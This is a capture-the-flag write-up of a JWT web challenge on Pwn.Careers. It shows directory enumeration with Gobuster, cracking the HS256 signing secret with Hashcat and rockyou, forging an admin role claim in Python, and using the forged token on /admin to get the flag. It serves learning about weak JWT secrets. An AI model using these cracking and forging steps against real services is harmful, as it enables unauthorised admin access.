# JWT of the Jungle

## Challenge Information

**Platform:** Pwn.Careers CTF

**Category:** Web Security / JSON Web Token (JWT)

**Difficulty:** Intermediate

## Challenge Overview

This challenge focused on analysing and exploiting a vulnerability involving JSON Web Tokens (JWT). The objective was to understand how the application handled authentication and identify a weakness that could be leveraged to obtain elevated privileges.

## Tools Used

- Firefox Developer Tools
- curl
- Kali Linux

- ## Methodology

## Methodology

### Step 1 – Initial Reconnaissance

I first inspected the challenge page to understand the application and identify the available functionality.

```bash
curl https://ctf.pwn.careers/jwt_of_the_jungle/
```

This confirmed that the challenge required authentication before further interaction.

> **Screenshot:** Home page of the challenge.

---

### Step 2 – Obtain a JWT Token

The challenge description instructed users to log in as the **guest** account. After authenticating, the application returned a JSON Web Token (JWT).

**Objective**

Obtain a valid JWT for further analysis.

**Result**

A JWT token was successfully obtained.

> **Screenshot:** Login response containing the JWT.

---

### Step 3 – Decode the JWT

Since JWTs are Base64URL encoded rather than encrypted, I decoded both the header and payload to inspect their contents.

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

parts = token.split(".")

print(json.loads(base64.urlsafe_b64decode(parts[0] + "==")))
print(json.loads(base64.urlsafe_b64decode(parts[1] + "==")))
```

The decoded payload revealed:

| Field | Value |
|-------|-------|
| Algorithm | HS256 |
| Username | guest |
| Role | user |

This suggested that changing the **role** field to **admin** might provide elevated privileges.

> **Screenshot:** Decoded JWT payload.

---

### Step 4 – Discover Hidden Endpoints

To identify additional application functionality, I performed directory enumeration using Gobuster.

```bash
gobuster dir \
-u https://ctf.pwn.careers/jwt_of_the_jungle/ \
-w /usr/share/wordlists/dirb/common.txt
```

The scan discovered an administrative endpoint:

```
/admin
```

Although the endpoint existed, it returned **HTTP 403 Forbidden**, indicating that additional privileges were required.

> **Screenshot:** Gobuster results.

---

### Step 5 – Recover the JWT Signing Secret

The JWT was signed using **HS256**, meaning it relied on a shared secret.

I used Hashcat with mode **16500**, which is designed for JWT-HMAC cracking.

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > jwt.txt

hashcat -a 0 -m 16500 jwt.txt \
/usr/share/wordlists/rockyou.txt --force
```

Hashcat successfully recovered the signing secret:

```
secret
```

> **Screenshot:** Successful Hashcat output.

---

### Step 6 – Forge an Administrator Token

With the signing secret recovered, I decoded the original token, modified the **role** claim from **user** to **admin**, and generated a new valid JWT.

```python
import sys
sys.path.insert(0, "/usr/lib/python3/dist-packages")

import jwt
import requests
import warnings

warnings.filterwarnings("ignore")

secret = "secret"

r = requests.post(
    "https://ctf.pwn.careers/jwt_of_the_jungle/login",
    json={"username":"guest","password":"guest"}
)

original = r.json()["token"]

decoded = jwt.decode(
    original,
    secret,
    algorithms=["HS256"],
    options={"verify_iat":False}
)

decoded["role"] = "admin"

forged = jwt.encode(decoded, secret, algorithm="HS256")
```

The forged token was accepted because it had been correctly signed using the recovered secret.

> **Screenshot:** Forged administrator JWT.

---

### Step 7 – Access the Administrator Endpoint

Testing revealed that the application expected the JWT directly in the **Authorization** header, without the standard **Bearer** prefix.

```python
r = requests.get(
    "https://ctf.pwn.careers/jwt_of_the_jungle/admin",
    headers={"Authorization": forged}
)
```

The request succeeded and the application returned the challenge flag.

**Flag**

```
CTF{jwt_token_tampering}
```

> **Screenshot:** Successful access to the administrator page and flag.
